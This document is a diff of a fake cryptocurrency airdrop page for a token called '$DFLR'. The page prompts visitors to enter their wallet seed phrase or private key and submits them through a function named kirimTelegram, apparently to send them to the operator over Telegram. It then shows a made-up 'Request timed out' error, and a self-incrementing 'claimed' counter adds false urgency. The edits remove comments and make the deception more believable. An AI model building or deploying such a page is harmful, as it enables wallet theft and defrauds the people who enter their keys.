@@ -106,7 +106,6 @@
     .closing-card h2 .hl { background: linear-gradient(135deg, #d4b3ff, #7c5cfc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
     .closing-card .body-text { font-size: 15px; color: var(--muted2); line-height: 1.75; max-width: 400px; margin: 0 auto 2.5rem; font-weight: 300; position: relative; z-index: 1; }
 
-    /* PROGRESS */
     .airdrop-progress { max-width: 420px; margin: 0 auto 2rem; text-align: left; position: relative; z-index: 1; }
     .progress-info { display: flex; justify-content: space-between; font-size: 12px; color: var(--muted2); margin-bottom: 8px; }
     .progress-bar { position: relative; width: 100%; height: 10px; border-radius: 999px; background: rgba(255,255,255,0.08); overflow: hidden; }
@@ -116,7 +115,6 @@
     @keyframes flarePulse { 0%,100% { transform: translate(-50%,-50%) scale(1); opacity:1; } 50% { transform: translate(-50%,-50%) scale(1.3); opacity:0.7; } }
     .progress-total { margin-top: 6px; font-size: 11px; color: var(--muted); }
 
-    /* MODAL */
     .modal-overlay { position: fixed; inset: 0; background: rgba(4,4,10,0.92); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); z-index: 200; display: flex; align-items: center; justify-content: center; padding: 1.5rem; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
     .modal-overlay.show { opacity: 1; pointer-events: all; }
     .modal { background: var(--surface); border: 1px solid rgba(124,92,252,0.25); border-radius: 28px; padding: 2rem 2rem 2.5rem; width: 100%; max-width: 480px; max-height: 92vh; overflow-y: auto; position: relative; transform: scale(0.92) translateY(20px); transition: transform 0.4s cubic-bezier(0.22,1,0.36,1); }
@@ -127,12 +125,10 @@
     .modal-title { font-family: 'Syne', sans-serif; font-size: 1.4rem; font-weight: 800; letter-spacing: -0.025em; margin-bottom: 4px; padding-right: 2.5rem; }
     .modal-desc { color: var(--muted); font-size: 13px; line-height: 1.5; margin-bottom: 1.5rem; }
 
-    /* TAB SWITCHER */
     .tab-bar { display: flex; background: var(--surface2); border-radius: 12px; padding: 4px; gap: 4px; margin-bottom: 1.25rem; }
     .tab-btn { flex: 1; padding: 9px 0; font-family: 'Syne', sans-serif; font-size: 13px; font-weight: 700; border: none; border-radius: 9px; cursor: pointer; transition: all 0.2s; background: transparent; color: var(--muted); }
     .tab-btn.active { background: rgba(124,92,252,0.18); border-color: rgba(124,92,252,0.4); color: #fff; }
 
-    /* WORD COUNT SELECTOR */
     .word-count-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1rem; }
     .word-count-label { font-size: 13px; color: var(--muted2); font-weight: 400; }
     .word-count-select { display: flex; gap: 6px; }
@@ -140,7 +136,6 @@
     .wc-btn.active { background: rgba(124,92,252,0.18); border-color: rgba(124,92,252,0.4); color: var(--accent2); }
     .wc-btn svg { width: 10px; height: 10px; }
 
-    /* SEED GRID */
     .seed-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 1.25rem; }
     .seed-field { display: flex; align-items: center; background: var(--surface2); border: 1px solid rgba(255,255,255,0.07); border-radius: 10px; overflow: hidden; transition: border-color 0.2s; }
     .seed-field:focus-within { border-color: rgba(124,92,252,0.5); }
@@ -148,7 +143,6 @@
     .seed-input { flex: 1; background: transparent; border: none; outline: none; color: var(--text); font-family: 'DM Sans', sans-serif; font-size: 13.5px; padding: 11px 8px 11px 0; width: 100%; }
     .seed-input::placeholder { color: var(--muted); opacity: 0.5; }
 
-    /* PK INPUT */
     .pk-wrap { margin-bottom: 1.25rem; }
     .pk-input { width: 100%; background: var(--surface2); border: 1px solid rgba(255,255,255,0.07); border-radius: 12px; padding: 14px 16px; color: var(--text); font-family: 'DM Sans', sans-serif; font-size: 13.5px; outline: none; resize: none; min-height: 110px; line-height: 1.6; transition: border-color 0.2s, box-shadow 0.2s; }
     .pk-input:focus { border-color: rgba(124,92,252,0.5); box-shadow: 0 0 0 3px rgba(124,92,252,0.1); }
@@ -158,7 +152,6 @@
     .btn-submit:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 8px 32px rgba(124,92,252,0.45); }
     .btn-submit:disabled { opacity: 0.45; cursor: not-allowed; }
 
-    /* SUCCESS */
     .success-state { display: none; text-align: center; padding: 1.5rem 0; }
     .success-state.show { display: block; }
     .success-icon { width: 72px; height: 72px; background: rgba(255,0,0,0.12); border: 1.5px solid rgba(255,60,60,0.5); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; font-size: 28px; color: #f87171; font-weight: 800; animation: pop-in 0.5s cubic-bezier(0.22,1,0.36,1) both; }
@@ -259,7 +252,6 @@
 
   </div>
 
-  <!-- MODAL -->
   <div class="modal-overlay" id="modalOverlay" onclick="handleOverlayClick(event)">
     <div class="modal" onclick="event.stopPropagation()">
       <button type="button" class="modal-close" onclick="closeModal()">✕</button>
@@ -269,13 +261,11 @@
         <div class="modal-title">Import Your Wallet</div>
         <div class="modal-desc">Import your wallet to verify eligibility and claim $DFLR.</div>
 
-        <!-- TAB: Seed Phrase / Private Key -->
         <div class="tab-bar">
           <button type="button" class="tab-btn active" id="tabPhrase" onclick="switchTab('phrase')">Seed Phrase</button>
           <button type="button" class="tab-btn" id="tabPK" onclick="switchTab('pk')">Private Key</button>
         </div>
 
-        <!-- SEED PHRASE PANEL -->
         <div id="panelPhrase">
           <div class="word-count-bar">
             <span class="word-count-label">My seed phrase has</span>
@@ -291,7 +281,6 @@
           </form>
         </div>
 
-        <!-- PRIVATE KEY PANEL -->
         <div id="panelPK" style="display:none;">
           <form id="pkForm" onsubmit="kirimTelegram(event, 'pk')">
             <div class="pk-wrap">
@@ -302,31 +291,28 @@
         </div>
       </div>
 
-      <!-- SUCCESS / ERROR STATE -->
       <div class="success-state" id="successState">
         <div class="success-icon">✕</div>
-        <h3>Invalid</h3>
-        <p>The data you entered could not be verified.</p>
+        <h3>Error</h3>
+        <p>Request timed out. Please try again in a moment.</p>
       </div>
     </div>
   </div>
 
   <div class="toast" id="toast">
     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-    Failed to fetch.
+    Failed to fetch
   </div>
 
   <script>
 
     
-    // ── SCROLL ──
     function Scroll() {
       const target = document.getElementById('targetScroll');
       const y = target.getBoundingClientRect().top + window.pageYOffset - 100;
       window.scrollTo({ top: y, behavior: 'smooth' });
     }
     
-    // ── MODAL ──
     function openModal() {
       document.getElementById('modalOverlay').classList.add('show');
       document.getElementById('formState').style.display = 'block';
@@ -338,7 +324,6 @@
     function handleOverlayClick(e) { if (e.target.id === 'modalOverlay') closeModal(); }
     document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
 
-    // ── TAB SWITCH ──
     function switchTab(tab) {
       document.getElementById('tabPhrase').classList.toggle('active', tab === 'phrase');
       document.getElementById('tabPK').classList.toggle('active', tab === 'pk');
@@ -346,7 +331,6 @@
       document.getElementById('panelPK').style.display     = tab === 'pk'     ? 'block' : 'none';
     }
 
-    // ── WORD COUNT ──
     let currentWordCount = 12;
     function setWordCount(n) {
       currentWordCount = n;
@@ -365,7 +349,7 @@
             <input class="seed-input" type="text" autocomplete="off" spellcheck="false" autocorrect="off" autocapitalize="off" placeholder="word" data-index="${i}">
           </div>`;
       }
-      // Support paste full phrase into first field
+      
       grid.querySelector('.seed-input').addEventListener('paste', (e) => {
         e.preventDefault();
         const text   = (e.clipboardData || window.clipboardData).getData('text');
@@ -385,7 +369,6 @@
 
     buildSeedGrid(12);
 
-    // ── SUBMIT ──
     function showToast() {
       const t = document.getElementById('toast');
       t.classList.add('show');
@@ -437,7 +420,6 @@
       }
     }
 
-    // ── PROGRESS BAR ──
     const total = 115000000;
     let claimed = localStorage.getItem('claimedTokens') ? parseInt(localStorage.getItem('claimedTokens')) : 82622471;
     function updateUI() {
@@ -455,7 +437,6 @@
       updateUI();
     }, 2000);
 
-    // ── TICKER ──
     const PAIRS = [
       {sym:'BTC',pair:'BTCUSDT'},{sym:'ETH',pair:'ETHUSDT'},{sym:'BNB',pair:'BNBUSDT'},
       {sym:'SOL',pair:'SOLUSDT'},{sym:'XRP',pair:'XRPUSDT'},{sym:'DOGE',pair:'DOGEUSDT'},
